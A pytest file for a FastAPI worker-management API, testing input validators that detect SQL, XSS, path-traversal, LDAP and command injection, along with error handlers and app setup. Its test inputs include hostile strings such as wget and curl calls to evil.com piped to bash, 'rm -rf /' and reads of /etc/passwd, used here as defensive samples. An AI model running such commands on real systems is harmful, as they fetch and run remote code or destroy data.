"""Tests for app_config, security_validation, and error_handlers uncovered paths.

Targets coverage gaps NOT handled by existing test files:
- test_app_config.py: covers health, HealthCheckFilter, create_secure_app basics
- test_error_handlers.py: covers exception classes, format_validation_errors,
  create_error_response, validate_string/list/dict_field, sanitize_input, handler functions

This file covers:
- app_config: middleware stack ordering, lifespan, docs enabled via ENABLE_DOCS,
  configure_logging, custom_openapi schema generation
- security_validation: detect_sql_injection, detect_xss, detect_path_traversal,
  detect_command_injection, detect_ldap_injection, validate_string_security,
  sanitize_html_content, validate_unicode_string, validate_identifier,
  validate_query_parameters, is_safe_json_data
- error_handlers: _path_matches_pattern, _get_allowed_methods_for_path,
  handle_405_method_not_allowed
"""

import asyncio
import logging
import os
from unittest.mock import MagicMock, patch

import pytest
from fastapi import HTTPException

from src.api.security_validation import (
    SecurityValidationError,
    detect_command_injection,
    detect_ldap_injection,
    detect_path_traversal,
    detect_sql_injection,
    detect_xss,
    is_safe_json_data,
    sanitize_html_content,
    validate_identifier,
    validate_query_parameters,
    validate_string_security,
    validate_unicode_string,
)

# ============================================================================
# Helpers
# ============================================================================


def _run(coro):
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()


# ============================================================================
# security_validation: detect_sql_injection
# ============================================================================


class TestDetectSqlInjection:
    def test_empty_string_returns_false(self):
        assert detect_sql_injection("") is False

    def test_clean_text_returns_false(self):
        assert detect_sql_injection("hello world") is False

    def test_union_select_detected(self):
        # "from " is a python indicator, so use quote prefix to avoid python mode
        assert detect_sql_injection("' UNION SELECT password") is True

    def test_semicolon_drop_detected(self):
        assert detect_sql_injection("; DROP TABLE users;") is True

    def test_sleep_function_detected(self):
        assert detect_sql_injection("sleep(5)") is True

    def test_information_schema_detected(self):
        assert detect_sql_injection("information_schema.tables") is True

    def test_python_code_is_lenient(self):
        # Python code context: common SQL keywords should NOT trigger
        python_code = "def select_items():\n    return True"
        assert detect_sql_injection(python_code) is False

    def test_python_code_with_real_injection_detected(self):
        # Even in Python code context, very obvious injection should be caught
        code = "def foo():\n    pass\n' or '1'='1'--"
        assert detect_sql_injection(code) is True

    def test_or_equals_pattern_detected(self):
        assert detect_sql_injection("' or '1'='1'--") is True

    def test_hex_encoding_attack(self):
        # Non-python context string with hex
        assert detect_sql_injection("input 0x41424344 value") is True

    def test_sql_comment_pattern(self):
        # Non-python context string with SQL comment
        assert detect_sql_injection("value --") is True

    def test_exec_function_detected(self):
        assert detect_sql_injection("exec('malicious')") is True


# ============================================================================
# security_validation: detect_xss
# ============================================================================


class TestDetectXss:
    def test_empty_string_returns_false(self):
        assert detect_xss("") is False

    def test_clean_text_returns_false(self):
        assert detect_xss("normal text here") is False

    def test_script_tag_detected(self):
        assert detect_xss("<script>alert('xss')</script>") is True

    def test_event_handler_detected(self):
        assert detect_xss('<img onerror="alert(1)">') is True

    def test_javascript_url_detected(self):
        assert detect_xss("javascript:alert(1)") is True

    def test_iframe_detected(self):
        assert detect_xss('<iframe src="evil.html">') is True

    def test_eval_detected(self):
        assert detect_xss("eval('malicious')") is True

    def test_python_code_is_lenient(self):
        code = "def render():\n    return '<div>safe</div>'"
        assert detect_xss(code) is False

    def test_python_code_with_script_tag_detected(self):
        code = "def foo():\n    x = '<script>alert(1)</script>'"
        assert detect_xss(code) is True

    def test_url_encoded_script_detected(self):
        assert detect_xss("%3cscript%3e") is True


# ============================================================================
# security_validation: detect_path_traversal
# ============================================================================


class TestDetectPathTraversal:
    def test_empty_string_returns_false(self):
        assert detect_path_traversal("") is False

    def test_clean_path_returns_false(self):
        assert detect_path_traversal("/normal/path") is False

    def test_dot_dot_slash_detected(self):
        assert detect_path_traversal("../../etc/passwd") is True

    def test_url_encoded_traversal_detected(self):
        assert detect_path_traversal("..%2f..%2fetc/passwd") is True

    def test_file_protocol_detected(self):
        assert detect_path_traversal("file:///etc/shadow") is True

    def test_etc_passwd_detected(self):
        assert detect_path_traversal("/etc/passwd") is True

    def test_windows_path_detected(self):
        assert detect_path_traversal("\\windows\\system32") is True


# ============================================================================
# security_validation: detect_command_injection
# ============================================================================


class TestDetectCommandInjection:
    def test_empty_string_returns_false(self):
        assert detect_command_injection("") is False

    def test_clean_text_returns_false(self):
        assert detect_command_injection("normal input") is False

    def test_pipe_to_command_detected(self):
        assert detect_command_injection("| cat /etc/passwd") is True

    def test_backtick_substitution_detected(self):
        assert detect_command_injection("`whoami`") is True

    def test_dollar_paren_substitution_detected(self):
        assert detect_command_injection("$(id)") is True

    def test_rm_rf_detected(self):
        assert detect_command_injection("rm -rf /") is True

    def test_long_multiline_text_bypassed(self):
        # Long multiline content is treated as document content, not injection
        long_text = "line\n" * 200 + "; rm -rf /"
        assert detect_command_injection(long_text) is False

    def test_semicolon_command_detected(self):
        assert detect_command_injection("; wget http://evil.com/payload") is True


# ============================================================================
# security_validation: detect_ldap_injection
# ============================================================================


class TestDetectLdapInjection:
    def test_empty_string_returns_false(self):
        assert detect_ldap_injection("") is False

    def test_clean_text_returns_false(self):
        assert detect_ldap_injection("normal text") is False

    def test_ldap_wildcard_detected(self):
        assert detect_ldap_injection("*)(cn=admin") is True

    def test_ldap_or_injection_detected(self):
        assert detect_ldap_injection(")(|(uid=*") is True

    def test_user_password_injection_detected(self):
        assert detect_ldap_injection("*)(userPassword=secret") is True


# ============================================================================
# security_validation: validate_string_security
# ============================================================================


class TestValidateStringSecurity:
    def test_empty_string_passes(self):
        assert validate_string_security("", "test") == ""

    def test_clean_string_passes(self):
        assert validate_string_security("hello", "test") == "hello"

    def test_null_byte_raises(self):
        with pytest.raises(SecurityValidationError, match="null bytes"):
            validate_string_security("foo\x00bar", "field")

    def test_exceeds_max_length_raises(self):
        with pytest.raises(SecurityValidationError, match="exceeds maximum length"):
            validate_string_security("a" * 200, "field", max_length=100)

    def test_control_character_raises(self):
        with pytest.raises(SecurityValidationError, match="control character"):
            validate_string_security("abc\x01def", "field")

    def test_tabs_newlines_allowed(self):
        result = validate_string_security("line1\nline2\ttab", "field")
        assert "line1" in result

    def test_sql_injection_in_strict_mode(self):
        with pytest.raises(SecurityValidationError, match="SQL injection"):
            validate_string_security("sleep(5)", "field")

    def test_xss_in_strict_mode(self):
        with pytest.raises(SecurityValidationError, match="XSS"):
            validate_string_security("<script>alert(1)</script>", "field")

    def test_path_traversal_in_strict_mode(self):
        with pytest.raises(SecurityValidationError, match="path traversal"):
            validate_string_security("../../etc/passwd", "field")

    def test_command_injection_in_strict_mode(self):
        with pytest.raises(SecurityValidationError, match="command injection"):
            validate_string_security("; wget http://evil.com", "field")

    def test_ldap_injection_in_strict_mode(self):
        with pytest.raises(SecurityValidationError, match="LDAP injection"):
            validate_string_security("*)(cn=admin", "field")

    def test_xss_allowed_when_allow_html(self):
        # XSS detection skipped when allow_html=True
        result = validate_string_security("onclick=alert(1)", "field", allow_html=True)
        assert "onclick" in result

    def test_non_strict_mode_skips_injection_checks(self):
        # In non-strict mode, SQL injection patterns pass through
        result = validate_string_security("UNION SELECT * FROM users", "field", strict_mode=False)
        assert "UNION" in result

    def test_prompt_field_skips_entire_injection_battery(self):
        # prompt_field=True skips SQL/XSS/path-traversal/LDAP/command-injection
        # (surfaces an LLM prompt never touches); only structural guards remain.
        for payload in (
            "<script>alert(1)</script>",
            "<style>/* c */ .x{color:#fff}</style>",
            "../../../etc/passwd",
            "' OR '1'='1' --",
            "SELECT * FROM users; DROP TABLE accounts;",
            "*)(cn=admin",
            "; wget http://evil.com | bash",
            "$(rm -rf /) && curl http://x",
        ):
            assert validate_string_security("ctx: " + payload, "field", prompt_field=True)

    def test_prompt_field_still_enforces_structural_guards(self):
        with pytest.raises(SecurityValidationError, match="null bytes"):
            validate_string_security("foo\x00bar", "field", prompt_field=True)
        with pytest.raises(SecurityValidationError, match="exceeds maximum length"):
            validate_string_security("a" * 200, "field", max_length=100, prompt_field=True)

    def test_non_prompt_field_still_flags_command_injection(self):
        # Without prompt_field, the battery still runs for non-prompt fields.
        with pytest.raises(SecurityValidationError, match="command injection"):
            validate_string_security("; wget http://evil.com", "field")


# ============================================================================
# security_validation: sanitize_html_content
# ============================================================================


class TestSanitizeHtmlContent:
    def test_empty_returns_empty(self):
        assert sanitize_html_content("") == ""

    def test_escapes_tags(self):
        result = sanitize_html_content("<script>alert(1)</script>")
        assert "<script>" not in result
        assert "&lt;script&gt;" in result

    def test_escapes_quotes(self):
        result = sanitize_html_content('value="hello"')
        assert "&quot;" in result

    def test_plain_text_passes_through(self):
        assert sanitize_html_content("plain text") == "plain text"


# ============================================================================
# security_validation: validate_unicode_string
# ============================================================================


class TestValidateUnicodeString:
    def test_empty_returns_empty(self):
        assert validate_unicode_string("", "field") == ""

    def test_normal_text_passes(self):
        assert validate_unicode_string("hello world", "field") == "hello world"

    def test_bom_raises(self):
        with pytest.raises(SecurityValidationError, match="dangerous Unicode"):
            validate_unicode_string("\ufeff test", "field")

    def test_rtl_override_raises(self):
        with pytest.raises(SecurityValidationError, match="dangerous Unicode"):
            validate_unicode_string("test \u202e hidden", "field")

    def test_line_separator_raises(self):
        with pytest.raises(SecurityValidationError, match="separator"):
            validate_unicode_string("line\u2028next", "field")


# ============================================================================
# security_validation: validate_identifier
# ============================================================================


class TestValidateIdentifier:
    def test_valid_identifier(self):
        assert validate_identifier("my_worker", "name") == "my_worker"

    def test_empty_raises(self):
        with pytest.raises(SecurityValidationError, match="cannot be empty"):
            validate_identifier("", "name")

    def test_whitespace_only_raises(self):
        with pytest.raises(SecurityValidationError, match="cannot be empty"):
            validate_identifier("   ", "name")

    def test_exceeds_max_length_raises(self):
        with pytest.raises(SecurityValidationError, match="exceeds maximum length"):
            validate_identifier("a" * 200, "name", max_length=100)

    def test_null_byte_raises(self):
        with pytest.raises(SecurityValidationError, match="null bytes"):
            validate_identifier("abc\x00def", "name")

    def test_reserved_name_raises(self):
        with pytest.raises(SecurityValidationError, match="reserved name"):
            validate_identifier("admin", "name")

    def test_reserved_name_case_insensitive(self):
        with pytest.raises(SecurityValidationError, match="reserved name"):
            validate_identifier("SELECT", "name")

    def test_must_start_with_alnum_or_underscore(self):
        with pytest.raises(SecurityValidationError, match="must start with"):
            validate_identifier("-invalid", "name")

    def test_invalid_character_in_body(self):
        with pytest.raises(SecurityValidationError, match="invalid character"):
            validate_identifier("my worker", "name")  # space is invalid

    def test_ascii_only_mode(self):
        result = validate_identifier("valid_name", "name", allow_unicode=False)
        assert result == "valid_name"

    def test_ascii_only_rejects_invalid(self):
        with pytest.raises(SecurityValidationError, match="invalid characters"):
            validate_identifier("name with space", "name", allow_unicode=False)

    def test_strips_whitespace(self):
        assert validate_identifier("  my_worker  ", "name") == "my_worker"


# ============================================================================
# security_validation: validate_query_parameters
# ============================================================================


class TestValidateQueryParameters:
    def test_valid_params_pass(self):
        result = validate_query_parameters({"limit": "10", "offset": "0"})
        assert result == {"limit": "10", "offset": "0"}

    def test_invalid_param_name_raises(self):
        with pytest.raises(SecurityValidationError, match="Invalid query parameter"):
            validate_query_parameters({"bad-name!": "value"})

    def test_xss_in_value_raises(self):
        with pytest.raises(SecurityValidationError, match="XSS"):
            validate_query_parameters({"q": "<script>alert(1)</script>"})

    def test_sql_injection_in_value_raises(self):
        with pytest.raises(SecurityValidationError, match="SQL injection"):
            validate_query_parameters({"q": "sleep(5)"})

    def test_long_value_raises(self):
        with pytest.raises(SecurityValidationError, match="too long"):
            validate_query_parameters({"q": "x" * 1001})

    def test_non_string_values_pass(self):
        result = validate_query_parameters({"count": 42, "active": True})
        assert result["count"] == 42
        assert result["active"] is True


# ============================================================================
# security_validation: is_safe_json_data
# ============================================================================


class TestIsSafeJsonData:
    def test_simple_dict_is_safe(self):
        assert is_safe_json_data({"key": "value"}) is True

    def test_simple_list_is_safe(self):
        assert is_safe_json_data([1, 2, 3]) is True

    def test_deeply_nested_is_unsafe(self):
        data = {"a": {"b": {"c": {"d": {"e": {"f": {"g": {"h": {"i": {"j": {"k": "deep"}}}}}}}}}}}
        assert is_safe_json_data(data, max_depth=5) is False

    def test_too_many_keys_is_unsafe(self):
        data = {str(i): i for i in range(1001)}
        assert is_safe_json_data(data) is False

    def test_too_long_key_is_unsafe(self):
        data = {"x" * 101: "value"}
        assert is_safe_json_data(data) is False

    def test_too_long_string_value_is_unsafe(self):
        data = {"key": "x" * 100001}
        assert is_safe_json_data(data) is False

    def test_too_large_array_is_unsafe(self):
        data = list(range(10001))
        assert is_safe_json_data(data) is False

    def test_nested_list_in_dict_is_safe(self):
        data = {"items": [1, 2, {"nested": True}]}
        assert is_safe_json_data(data) is True

    def test_non_string_key_is_unsafe(self):
        # is_safe_json_data checks key type
        data = {123: "value"}
        assert is_safe_json_data(data) is False


# ============================================================================
# error_handlers: _path_matches_pattern
# ============================================================================


class TestPathMatchesPattern:
    def test_exact_match(self):
        from src.api.error_handlers import _path_matches_pattern

        assert _path_matches_pattern("/api/workers", "/api/workers") is True

    def test_dynamic_segment_matches(self):
        from src.api.error_handlers import _path_matches_pattern

        assert _path_matches_pattern("/api/workers/my-worker", "/api/workers/{worker_name}") is True

    def test_different_length_no_match(self):
        from src.api.error_handlers import _path_matches_pattern

        assert _path_matches_pattern("/api/workers", "/api/workers/extra") is False

    def test_different_static_segment_no_match(self):
        from src.api.error_handlers import _path_matches_pattern

        assert _path_matches_pattern("/api/graphs", "/api/workers") is False


# ============================================================================
# error_handlers: _get_allowed_methods_for_path
# ============================================================================


class TestGetAllowedMethodsForPath:
    def test_exact_match_returns_methods(self):
        from src.api.error_handlers import _get_allowed_methods_for_path

        endpoint_methods = {"/api/workers": {"GET", "POST"}}
        result = _get_allowed_methods_for_path("/api/workers", endpoint_methods)
        assert set(result) == {"GET", "POST"}

    def test_no_match_returns_empty(self):
        from src.api.error_handlers import _get_allowed_methods_for_path

        result = _get_allowed_methods_for_path("/unknown", {})
        assert result == []

    def test_pattern_match_returns_methods(self):
        from src.api.error_handlers import _get_allowed_methods_for_path

        endpoint_methods = {"/api/workers/{name}": {"GET", "PUT", "DELETE"}}
        result = _get_allowed_methods_for_path("/api/workers/test", endpoint_methods)
        assert set(result) == {"GET", "PUT", "DELETE"}


# ============================================================================
# error_handlers: handle_405_method_not_allowed
# ============================================================================


class TestHandle405:
    def test_returns_405_with_allow_header(self):
        from src.api.error_handlers import handle_405_method_not_allowed

        # Build a mock request with an app that has routes
        mock_request = MagicMock()
        mock_request.method = "DELETE"
        mock_request.url = MagicMock()
        mock_request.url.path = "/api/workers"
        mock_request.client = MagicMock()
        mock_request.client.host = "127.0.0.1"
        mock_request.headers = MagicMock()
        mock_request.headers.get = lambda k, d=None: None  # noqa: ARG005

        # Create a fake route
        route = MagicMock()
        route.path = "/api/workers"
        route.methods = {"GET", "POST"}
        mock_request.app = MagicMock()
        mock_request.app.routes = [route]

        exc = HTTPException(status_code=405, detail="Method Not Allowed")

        resp = _run(handle_405_method_not_allowed(mock_request, exc))
        assert resp.status_code == 405
        assert "Allow" in resp.headers

    def test_fallback_to_exception_headers(self):
        from src.api.error_handlers import handle_405_method_not_allowed

        mock_request = MagicMock()
        mock_request.method = "PATCH"
        mock_request.url = MagicMock()
        mock_request.url.path = "/unknown"
        mock_request.headers = MagicMock()
        mock_request.headers.get = lambda k, d=None: None  # noqa: ARG005
        mock_request.app = MagicMock()
        mock_request.app.routes = []

        exc = HTTPException(
            status_code=405,
            detail="Not Allowed",
            headers={"Allow": "GET, POST"},
        )

        resp = _run(handle_405_method_not_allowed(mock_request, exc))
        assert resp.status_code == 405
        assert resp.headers.get("Allow") == "GET, POST"


# ============================================================================
# app_config: middleware stack and configuration
# ============================================================================


class TestAppConfigMiddleware:
    def test_create_secure_app_with_rate_limiting_enabled(self):
        import src.api.app_config as app_cfg

        with (
            patch.dict(os.environ, {"ENABLE_AUTH": "false"}),
            patch.object(app_cfg, "ENABLE_AUTHENTICATION", False),
            patch.object(app_cfg, "ENABLE_RATE_LIMITING", True),
        ):
            app = app_cfg.create_secure_app()
            # Should have middleware registered
            assert len(app.user_middleware) > 0

    def test_create_secure_app_with_auth_enabled(self):
        import src.api.app_config as app_cfg

        with (
            patch.dict(os.environ, {"ENABLE_RATE_LIMITING": "false"}),
            patch.object(app_cfg, "ENABLE_RATE_LIMITING", False),
            patch.object(app_cfg, "ENABLE_AUTHENTICATION", True),
        ):
            app = app_cfg.create_secure_app()
            # Should have AuthenticationMiddleware registered
            middleware_classes: list[str] = []
            for m in app.user_middleware:
                cls = getattr(m, "cls", None)
                if cls is None:
                    continue
                middleware_classes.append(cls.__name__)
            assert "AuthenticationMiddleware" in middleware_classes

    def test_docs_enabled_via_enable_docs(self):
        import src.api.app_config as app_cfg

        with (
            patch.dict(
                os.environ,
                {"ENABLE_AUTH": "false", "ENABLE_RATE_LIMITING": "false"},
            ),
            patch.object(app_cfg, "ENABLE_AUTHENTICATION", False),
            patch.object(app_cfg, "ENABLE_RATE_LIMITING", False),
            patch.object(app_cfg, "DEBUG", False),
            patch.object(app_cfg, "ENABLE_DOCS", True),
        ):
            app = app_cfg.create_secure_app()
            assert app.docs_url == "/docs"
            assert app.redoc_url == "/redoc"
            assert app.openapi_url == "/openapi.json"


class TestAppConfigLifespan:
    @pytest.mark.asyncio
    async def test_lifespan_logs_startup_info(self):
        """Lifespan context manager logs startup information."""
        import src.api.app_config as app_cfg

        with (
            patch.dict(
                os.environ,
                {"ENABLE_AUTH": "false", "ENABLE_RATE_LIMITING": "false"},
            ),
            patch.object(app_cfg, "ENABLE_AUTHENTICATION", False),
            patch.object(app_cfg, "ENABLE_RATE_LIMITING", False),
        ):
            app = app_cfg.create_secure_app()
            with patch.object(app_cfg.logger, "info") as mock_log:
                async with app_cfg.lifespan(app):
                    # Verify startup logging happened
                    log_messages = [str(c.args[0]) for c in mock_log.call_args_list if c.args]
                    assert any("Starting Worker Management API" in m for m in log_messages)
                    assert any("Environment" in m for m in log_messages)


class TestAppConfigCustomOpenApi:
    def test_custom_openapi_returns_schema(self):
        import src.api.app_config as app_cfg

        with (
            patch.dict(
                os.environ,
                {"ENABLE_AUTH": "false", "ENABLE_RATE_LIMITING": "false"},
            ),
            patch.object(app_cfg, "ENABLE_AUTHENTICATION", False),
            patch.object(app_cfg, "ENABLE_RATE_LIMITING", False),
        ):
            app = app_cfg.create_secure_app()
            schema = app.openapi()
            assert "components" in schema
            assert "securitySchemes" in schema["components"]
            assert "BearerAuth" in schema["components"]["securitySchemes"]

    def test_custom_openapi_caches_schema(self):
        import src.api.app_config as app_cfg

        with (
            patch.dict(
                os.environ,
                {"ENABLE_AUTH": "false", "ENABLE_RATE_LIMITING": "false"},
            ),
            patch.object(app_cfg, "ENABLE_AUTHENTICATION", False),
            patch.object(app_cfg, "ENABLE_RATE_LIMITING", False),
        ):
            app = app_cfg.create_secure_app()
            schema1 = app.openapi()
            schema2 = app.openapi()
            assert schema1 is schema2  # Same object = cached


class TestConfigureLogging:
    def test_configure_logging_sets_health_check_filter(self):
        from src.api.app_config import HealthCheckFilter, configure_logging

        configure_logging()
        uvicorn_access = logging.getLogger("uvicorn.access")
        filter_types = [type(f) for f in uvicorn_access.filters]
        assert HealthCheckFilter in filter_types

    def test_configure_logging_production(self):
        import src.api.app_config as app_cfg

        with patch.object(app_cfg, "ENVIRONMENT", "production"):
            app_cfg.configure_logging()
            # Production mode should reduce verbosity
            uvicorn_logger = logging.getLogger("uvicorn.access")
            assert uvicorn_logger.level >= logging.WARNING


def test_system_prompt_allows_backtick_field_references():
    """system_prompt is LLM input, not shell input - backticks for template field names are legitimate."""
    from src.api.security_validation import validate_string_security

    prompt = (
        "Generate a course curriculum. Output JSON with fields:\n"
        "- `title`: course title\n"
        "- `lessons`: array of lesson objects with `name` and `description`\n"
    )
    validate_string_security(
        prompt, "system_prompt", max_length=5000, allow_html=False, strict_mode=True
    )
